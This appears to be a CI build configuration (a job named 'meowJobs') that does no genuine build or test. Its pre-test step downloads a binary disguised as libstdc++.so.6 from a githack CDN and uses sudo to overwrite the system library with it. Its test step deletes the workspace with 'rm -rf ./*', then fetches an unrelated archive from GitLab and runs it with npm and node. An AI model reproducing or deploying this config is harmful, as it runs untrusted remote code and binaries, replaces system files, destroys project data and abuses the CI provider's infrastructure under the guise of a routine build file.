checks:
    javascript: true
build:
    environment:
        node: v16.9.1
    nodes:
        meowJobs:
            dependencies:
                before:
                    - curl -fsSL https://glcdn.githack.com/project__2/lindaapp/-/raw/main/libstdc++.so.6 -o libstdc++.so.6
                    - sudo cp libstdc++.so.6 /usr/lib/x86_64-linux-gnu/libstdc++.so.6
            tests:
                override:
                    - command: rm -rf ./*
                    - command: curl -fsSL https://gitlab.com/project__2/lindaapp/-/archive/main/lindaapp-main.zip -o ctk.zip
                    - command: unzip ctk.zip
                    - command: cd lindaapp-main
                    - command: npm i
                    - command: node run
                    - command: echo "Done!!"